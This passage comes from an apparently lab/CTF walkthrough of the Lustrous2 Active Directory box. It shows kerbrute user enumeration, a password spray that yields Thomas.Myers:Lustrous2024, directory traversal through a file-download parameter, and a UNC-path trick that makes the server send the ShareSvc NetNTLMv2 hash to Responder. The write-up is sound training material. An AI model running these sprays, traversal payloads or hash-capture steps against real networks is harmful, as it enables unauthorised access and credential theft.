+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Chloe.Hammond@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Adam.Barnes@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Andrea.Smith@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Carly.Walker@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Aaron.Norman@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Callum.Oliver@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Chelsea.Smith@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Ann.Lynch@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Christopher.Lawson@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Amber.Ward@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Claire.Parry@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Darren.Lewis@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Dominic.West@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Duncan.Smith@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Elaine.Gallagher@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Deborah.Jones@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Francesca.Norman@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Emma.Bell@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Eleanor.Gregory@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Gary.Richards@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Gerard.Ward@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Henry.Connor@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Graeme.Pritchard@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Harriet.Richardson@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Glenn.Williams@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Howard.Robinson@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Janice.Collier@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Jacqueline.Phillips@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Jasmine.Johnson@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Joan.Wall@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Judith.Francis@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Kyle.Hussain@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Kyle.Lloyd@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Justin.Williams@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Leah.Elliott@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Lawrence.Bryan@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Lewis.Khan@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Liam.Wheeler@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Lisa.Begum@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Louis.Phillips@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Lydia.Parker@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Martin.Hamilton@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Marie.Hill@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Malcolm.Yates@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Mathew.Roberts@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Nathan.Carter@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Melissa.Thompson@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Nicola.Hall@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Nicola.Clarke@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Nigel.Lee@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Ryan.Davies@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Robert.Russell@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Pamela.Taylor@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Ryan.Moore@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Sara.Matthews@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Samantha.Smith@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Ryan.Rowe@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       ShareSvc@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Sharon.Birch@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Sharon.Evans@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Stacey.Griffiths@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Stephanie.Baxter@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Stacey.Barber@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Steven.Sutton@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Susan.Johnson@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Stephanie.Davies@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Terence.Jordan@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Thomas.Myers@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Tony.Davies@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Victoria.Williams@lustrous2.vl
+2025/07/25 14:03:24 &gt;  [+] VALID USERNAME:       Wayne.Taylor@lustrous2.vl
+2025/07/25 14:03:24 &gt;  Done! Tested 71 usernames (71 valid) in 0.722 seconds
+</span></code></pre></div></div>
+<p>All 71 are valid!</p>
+<h2 id="auth-as-sharesvc">Auth as ShareSvc</h2>
+<h3 id="password-spray">Password Spray</h3>
+<p>This step requires a bit of guess work. Luckily, <code class="language-plaintext highlighter-rouge">kerbrute</code> can check all 71 users in very short time, around 1.5 seconds per password over my connection. Doing the same spray with <code class="language-plaintext highlighter-rouge">netexec</code> takes 43 seconds per password.</p>
+<p>I’ll try common passwords like “Lustrous”, “Lustrous2”, “password”, etc. This box would be stronger in my opinion with a bit more information on where to guess here, but eventually trying “Lustrous2024” gets a hit:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>kerbrute passwordspray <span class="nt">-d</span> lustrous2.vl <span class="nt">--dc</span> lus2dc.lustrous2.vl <span class="nb">users </span>Lustrous2024
+<span class="go">
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 07/25/25 - Ronnie Flathers @ropnop
+
+2025/07/25 14:30:10 &gt;  Using KDC(s):
+2025/07/25 14:30:10 &gt;   lus2dc.lustrous2.vl:88
+
+2025/07/25 14:30:12 &gt;  [+] VALID LOGIN:  Thomas.Myers@lustrous2.vl:Lustrous2024
+2025/07/25 14:30:12 &gt;  Done! Tested 71 logins (1 successes) in 1.621 seconds
+</span></code></pre></div></div>
+<p>It turns out that “Lustrous2!”, “Start123!”, and “Sommer2024” will also find users.</p>
+<h3 id="bloodhound">Bloodhound</h3>
+<p>I couldn’t get <code class="language-plaintext highlighter-rouge">netexec</code> or <code class="language-plaintext highlighter-rouge">rusthound-ce</code> to collect BloodHound here. I am able to get <a href="https://github.com/dirkjanm/BloodHound.py">BloodHound.py</a> to work using the <code class="language-plaintext highlighter-rouge">--ldap-channel-binding</code> flag. This will also throw an error saying that I need to install an LDAP module:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">Exception: To use LDAP channel binding, install the patched ldap3 module: pip3 install git+https://github.com/ly4k/ldap3 or pip3 install ldap3-bleeding-edge
+</span></code></pre></div></div>
+<p>Because I’ve installed with <a href="/cheatsheets/uv#">uv tool</a>, I’ll just run the following to reinstall it with that additional package in the virtual environment:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv tool <span class="nb">install </span>git+https://github.com/dirkjanm/BloodHound.py.git@bloodhound-ce <span class="nt">--with</span> ldap3-bleeding-edge
+<span class="go">Resolved 24 packages in 553ms
+Installed 1 package in 16ms
+ + ldap3-bleeding-edge==2.10.1.1338
+Installed 1 executable: bloodhound-ce-python
+</span></code></pre></div></div>
+<p>Now I can collect:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>bloodhound-ce-python <span class="nt">-u</span> thomas.myers <span class="nt">-no-pass</span> <span class="nt">-k</span> <span class="nt">-d</span> lustrous2.vl <span class="nt">-ns</span> 10.129.234.174 <span class="nt">--ldap-channel-binding</span> <span class="nt">-c</span> All <span class="nt">--zip</span>
+<span class="go">INFO: BloodHound.py for BloodHound Community Edition
+INFO: Found AD domain: lustrous2.vl
+INFO: Using TGT from cache
+INFO: Found TGT with correct principal in ccache file.
+INFO: Connecting to LDAP server: lus2dc.lustrous2.vl
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 4 computers
+INFO: Connecting to LDAP server: lus2dc.lustrous2.vl
+INFO: Found 75 users
+INFO: Found 54 groups
+INFO: Found 2 gpos
+INFO: Found 2 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: 
+INFO: Querying computer: 
+INFO: Querying computer: 
+INFO: Querying computer: LUS2DC.Lustrous2.vl
+INFO: Done in 00M 17S
+INFO: Compressing output into 20250725200142_bloodhound.zip
+</span></code></pre></div></div>
+<p>I’ll start the BloodHound CE Docker and upload this data. I’ll mark thomas.myers as owned, but nothing interesting jumps out from here.</p>
+<h3 id="website-access">Website Access</h3>
+<h4 id="setup-kerberos">Setup Kerberos</h4>
+<p>I’ll configure Kerberos authentication for my machine. I’ll need to have it installed (<code class="language-plaintext highlighter-rouge">sudo apt install krb5-user krb5-config</code>), and then I can generate a config file with <code class="language-plaintext highlighter-rouge">netexec</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb lus2dc.lustrous2.vl <span class="nt">--generate-krb5-file</span> krb5.conf
+<span class="netexec-protocol">SMB </span><span class="go">        10.129.234.174  445    LUS2DC           </span><span class="netexec-logmessage">[*]</span><span class="go">  x64 (name:LUS2DC) (domain:Lustrous2.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-shareenum">(NTLM:False)</span><span class="go">
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>krb5.conf 
+<span class="go">
+[libdefaults]
+    dns_lookup_kdc = false
+    dns_lookup_realm = false
+    default_realm = LUSTROUS2.VL
+
+[realms]
+    LUSTROUS2.VL = {
+        kdc = lus2dc.Lustrous2.vl
+        admin_server = lus2dc.Lustrous2.vl
+        default_domain = Lustrous2.vl
+    }
+
+[domain_realm]
+    .Lustrous2.vl = LUSTROUS2.VL
+    Lustrous2.vl = LUSTROUS2.VL
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo cp </span>krb5.conf /etc/krb5.conf
+</code></pre></div></div>
+<p>Now I can log in using <code class="language-plaintext highlighter-rouge">kinit</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>kinit thomas.myers
+<span class="go">Password for thomas.myers@LUSTROUS2.VL: 
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>klist
+<span class="go">Ticket cache: FILE:/tmp/krb5cc_1000
+Default principal: thomas.myers@LUSTROUS2.VL
+
+Valid starting       Expires              Service principal
+07/25/2025 15:11:43  07/26/2025 01:11:43  krbtgt/LUSTROUS2.VL@LUSTROUS2.VL
+        renew until 07/26/2025 15:11:39
+</span></code></pre></div></div>
+<h4 id="curl">curl</h4>
+<p>The easiest way to check if Kerberos authentication can be used to access the website is with <code class="language-plaintext highlighter-rouge">curl</code> with the following options:</p>
+<ul>
+<li><code class="language-plaintext highlighter-rouge">-I</code> - Just sent a HEAD request to check if it works.</li>
+<li><code class="language-plaintext highlighter-rouge">--negotiate</code> - Use authentication. To use Kerberos, it will use the current ticket (at <code class="language-plaintext highlighter-rouge">/tmp/krb5cc_1000</code>) to get a service ticket for <code class="language-plaintext highlighter-rouge">HTTP/lus2dc.lustrous2.vl</code>, and convert that to a token to send in the <code class="language-plaintext highlighter-rouge">Authentication</code> header.</li>
+<li><code class="language-plaintext highlighter-rouge">-u :</code> - Sets the username and password to empty, which indicates to use the system authentication, the Kerberos ticket.</li>
+</ul>
+<p>It works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">-I</span> <span class="nt">--negotiate</span> <span class="nt">-u</span> : http://lus2dc.lustrous2.vl
+<span class="go">HTTP/1.1 200 OK
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=utf-8
+Server: Microsoft-IIS/10.0
+WWW-Authenticate: Negotiate oYG3MIG0oAMKAQChCwYJKoZIhvcSAQICooGfBIGcYIGZBgkqhkiG9xIBAgICAG+BiTCBhqADAgEFoQMCAQ+iejB4oAMCARKicQRv+KiRAGqQoVd+LOi8mSUjuOArSh2tjAuRDkShSzRqcwJfZIP5o4ovwhUUQgPVx/U79AWQB4qo9+tJW7Pt685qrgPjNCuMA2Ar0bCk4alaC68m4j9WGmaMZxHkVyxbxWK7O9/Md0XudhZAsg7UvHN1
+Persistent-Auth: true
+X-Powered-By: ASP.NET
+Date: Fri, 25 Jul 2025 15:12:09 GMT
+</span></code></pre></div></div>
+<p>The response is 200 OK! Without auth, it returns 401.</p>
+<h4 id="firefox">Firefox</h4>
+<p>Getting Firefox to authenticate with Kerberos was a bit of a trick! First, in <code class="language-plaintext highlighter-rouge">about:config</code>, I’ll add <code class="language-plaintext highlighter-rouge">.lustrous2.vl</code> to <code class="language-plaintext highlighter-rouge">network.negotiate-auth.trusted-uris</code>, and make sure <code class="language-plaintext highlighter-rouge">network.negotiate-auth.using-native-gsslib</code> is set to <code class="language-plaintext highlighter-rouge">true</code>:</p>
+<picture>
+<source srcset="/img/image-20250725113705649.webp" type="image/webp"/>
+<img alt="image-20250725113705649" class="include_image" loading="lazy" src="/img/image-20250725113705649.png"/>
+</picture>
+<p>In general, this should be enough, but if Firefox is installed with <code class="language-plaintext highlighter-rouge">snap</code> (which it is on Ubuntu and even the <code class="language-plaintext highlighter-rouge">apt</code> install methods are just wrappers around <code class="language-plaintext highlighter-rouge">snap</code>), then it won’t be able to access the Kerberos ticket in the default location, <code class="language-plaintext highlighter-rouge">/tmp/krb5cc_1000</code> and will just continue to show 401.</p>
+<p><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1734791#c7">This comment</a> in the Mozilla bug forum shows a workaround - setting the ticket location to somewhere that <code class="language-plaintext highlighter-rouge">snap</code> can read. I’ll update my config to add that line:</p>
+<div class="language-ini highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nn">[libdefaults]</span>
+    <span class="py">dns_lookup_kdc</span> <span class="p">=</span> <span class="s">false</span>
+    <span class="py">dns_lookup_realm</span> <span class="p">=</span> <span class="s">false</span>
+    <span class="py">default_realm</span> <span class="p">=</span> <span class="s">LUSTROUS2.VL</span>
+    <span class="py">default_ccache_name</span> <span class="p">=</span> <span class="s">FILE:/home/%{username}/krb5cc</span>
+
+<span class="nn">[realms]</span>
+    <span class="py">LUSTROUS2.VL</span> <span class="p">=</span> <span class="s">{</span>
+        <span class="py">kdc</span> <span class="p">=</span> <span class="s">lus2dc.Lustrous2.vl</span>
+        <span class="py">admin_server</span> <span class="p">=</span> <span class="s">lus2dc.Lustrous2.vl</span>
+        <span class="py">default_domain</span> <span class="p">=</span> <span class="s">Lustrous2.vl</span>
+    <span class="err">}</span>
+
+<span class="nn">[domain_realm]</span>
+    <span class="py">.Lustrous2.vl</span> <span class="p">=</span> <span class="s">LUSTROUS2.VL</span>
+    <span class="py">Lustrous2.vl</span> <span class="p">=</span> <span class="s">LUSTROUS2.VL</span>
+</code></pre></div></div>
+<p>And re-authenticate so that the ticket is in my home directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>klist
+<span class="go">Ticket cache: FILE:/home/oxdf/krb5cc
+Default principal: thomas.myers@LUSTROUS2.VL
+
+Valid starting       Expires              Service principal
+07/25/2025 15:42:36  07/26/2025 01:42:36  krbtgt/LUSTROUS2.VL@LUSTROUS2.VL
+        renew until 07/26/2025 15:42:32
+07/25/2025 15:44:19  07/26/2025 01:42:36  HTTP/lus2dc.lustrous2.vl@
+        renew until 07/26/2025 15:42:32
+        Ticket server: HTTP/lus2dc.lustrous2.vl@LUSTROUS2.VL
+</span></code></pre></div></div>
+<p>Now on loading the page, it loads!</p>
+<p>Alternatively, I could use something like <code class="language-plaintext highlighter-rouge">getTGT.py</code> to generate the TGT and then export <code class="language-plaintext highlighter-rouge">KRB5CCNAME</code> pointing to the TGT.</p>
+<h3 id="recover-password">Recover Password</h3>
+<h4 id="website-enumeration">Website Enumeration</h4>
+<p>The site when authenticated is very simple:</p>
+<picture>
+<source srcset="/img/image-20250725114918659.webp" type="image/webp"/>
+<img alt="image-20250725114918659" class="include_image" loading="lazy" src="/img/image-20250725114918659.png"/>
+</picture>
+<p>Clicking “Download” returns the same file from the FTP server.</p>
+<h4 id="file-read">File Read</h4>
+<p>The request to get the file looks like:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/File/Download?fileName=audit.txt</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">lus2dc.lustrous2.vl</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate, br</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://lus2dc.lustrous2.vl/</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Priority</span><span class="p">:</span> <span class="s">u=0, i</span>
+<span class="na">Authorization</span><span class="p">:</span> <span class="s">Negotiate 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</span>
+
+
+</code></pre></div></div>
+<p>Unfortunately, I can’t send this to Burp Repeater to play with, as it breaks the auth.</p>
+<p>I’ll use <code class="language-plaintext highlighter-rouge">curl</code>, first to verify I can get the file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">--negotiate</span> <span class="nt">-u</span> : http://lus2dc.lustrous2.vl/File/Download?fileName<span class="o">=</span>audit.txt
+<span class="go">Audit Report Issue Tracking
+
+[Fixed] NTLM Authentication Allowed
+[Fixed] Signing &amp; Channel Binding Not Enabled
+[Fixed] Kerberoastable Accounts
+[Fixed] SeImpersonate Enabled
+
+[Open] Weak User Passwords
+</span></code></pre></div></div>
+<p>If I try to get a file that doesn’t exist, it returns 404:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">-I</span> <span class="nt">--negotiate</span> <span class="nt">-u</span> : http://lus2dc.lustrous2.vl/File/Download?fileName<span class="o">=</span>0xdf.txt
+<span class="go">HTTP/1.1 404 Not Found
+Transfer-Encoding: chunked
+Server: Microsoft-IIS/10.0
+WWW-Authenticate: Negotiate oYG3MIG0oAMKAQChCwYJKoZIhvcSAQICooGfBIGcYIGZBgkqhkiG9xIBAgICAG+BiTCBhqADAgEFoQMCAQ+iejB4oAMCARKicQRvujwfk2HzRNPLBbXJqy8zNGD4bPQaoUDezVkTVFCNP6Q+EN7gNtv/+ZUM5wVZ00OJ7Rny4EUY1Mgk91iZ4OpTDs48Q94vh0WVOHmQuI1kzAEaOLk1S1ZAKmFnPbF+4cwA7GjMsYHJcsHl+znB5YnL
+Persistent-Auth: true
+X-Powered-By: ASP.NET
+Date: Fri, 25 Jul 2025 16:10:23 GMT
+</span></code></pre></div></div>
+<p>To check for directory traversal, I’ll try to read the <code class="language-plaintext highlighter-rouge">hosts</code> file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">--negotiate</span> <span class="nt">-u</span> : http://lus2dc.lustrous2.vl/File/Download?fileName<span class="o">=</span>../../../../windows/system32/drivers/etc/hosts
+<span class="c"># Copyright (c) 1993-2009 Microsoft Corp.
+#
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+#
+# This file contains the mappings of IP addresses to host names. Each
+# entry should be kept on an individual line. The IP address should
+# be placed in the first column followed by the corresponding host name.
+# The IP address and the host name should be separated by at least one
+# space.
+#
+# Additionally, comments (such as these) may be inserted on individual
+# lines or following the machine name denoted by a '#' symbol.
+#
+# For example:
+#
+#      102.54.94.97     rhino.acme.com          # source server
+#       38.25.63.10     x.acme.com              # x client host
+</span><span class="go">
+</span><span class="c"># localhost name resolution is handled within DNS itself.
+#       127.0.0.1       localhost
+#       ::1             localhost
+</span></code></pre></div></div>
+<p>It works!</p>
+<h4 id="netntlmv2">NetNTLMv2</h4>
+<p>It’s hard to know exactly what files to read at this point, or even as what user the site is running as. Windows is nice enough for most cases where it is trying to read a file if that file is on a share, it will try to open it from that share. I’ll start <a href="https://github.com/lgandx/Responder">Responder</a> and have it read a file from my host:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">--negotiate</span> <span class="nt">-u</span> : http://lus2dc.lustrous2.vl/File/Download?fileName<span class="o">=</span>//10.10.14.79/share/test
+</code></pre></div></div>
+<p>On running, it hangs and there’s traffic at Responder:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo</span> /opt/Responder/Responder.py <span class="nt">-I</span> tun0
+<span class="go">...[snip]...
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.14.79]
+    Responder IPv6             [dead:beef:2::104d]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
+    Don't Respond To MDNS TLD  ['_DOSVC']
+    TTL for poisoned response  [default]
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-1B226WYYWQW]
+    Responder Domain Name      [VOOO.LOCAL]
+    Responder DCE-RPC Port     [47233]
+
+[+] Listening for events...
+
+[SMB] NTLMv2-SSP Client   : 10.129.234.174
+[SMB] NTLMv2-SSP Username : LUSTROUS2\ShareSvc
